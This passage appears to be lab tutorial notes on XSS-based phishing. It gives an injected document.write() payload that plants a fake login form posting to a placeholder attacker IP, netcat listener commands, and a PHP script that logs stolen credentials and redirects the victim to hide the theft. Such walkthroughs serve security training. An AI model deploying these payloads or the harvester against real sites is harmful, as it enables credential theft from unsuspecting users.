To write HTML code to the vulnerable page, we can use the JavaScript function `document.write()`, and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside 
the `write` function, the final JavaScript code should be as follows:

```jsx
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

**Cleaning Up the Page**

After injecting the login form, the original Image URL field is still visible. This makes the message "Please login to continue" less convincing. To remove the original form, use:

```
document.getElementById().remove()
```

**Finding the Element ID**

Open the Page Inspector:

```
CTRL + SHIFT + C
```

Click the Image URL form. Its HTML is:

```
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

The form's ID is: `urlform`

**Removing the Form**

Use:

```
document.getElementById('urlform').remove();
```

Combine it with the previous JavaScript:

```jsx
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP:PORT><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Now the Image URL form disappears, leaving only the fake login form.

**Credential Stealing**

If you try logging in, you'll likely see: “This site can't be reached” . This happens because the form sends data to OUR_IP, but no server is listening there.

**Listening with Netcat**

Start a Netcat listener on port **80**:

```
sudo nc -lvnp 80
```

Now log in using:

```
Username: test
Password: test
```

(Replace OUR_IP in the payload with your actual IP.)

Netcat receives:

```
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

**Improving the Attack**

A Netcat listener does not return a valid HTTP response. As a result, the victim sees an Unable to connect error, which may look suspicious. A better approach is to use a small PHP server that:

1. Saves the credentials.
2. Redirects the victim back to the legitimate page.

This makes the victim think the login worked normally.

Create `index.php` (replace SERVER_IP with the exercise server IP):

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

This script: Saves credentials into `creds.txt`. , Redirects the victim back to the original Image Viewer page. , Exits.

**Starting the PHP Server**

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php
sudo php -S 0.0.0.0:80
```

Output:

```
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

**Testing :** Log into the fake form again. This time, you are redirected back to:

```
http://SERVER_IP/phishing/index.php
```

which is the original Image Viewer page. To verify that credentials were captured:

```
cat creds.txt
```

Output:

```
Username: test | Password: test
```
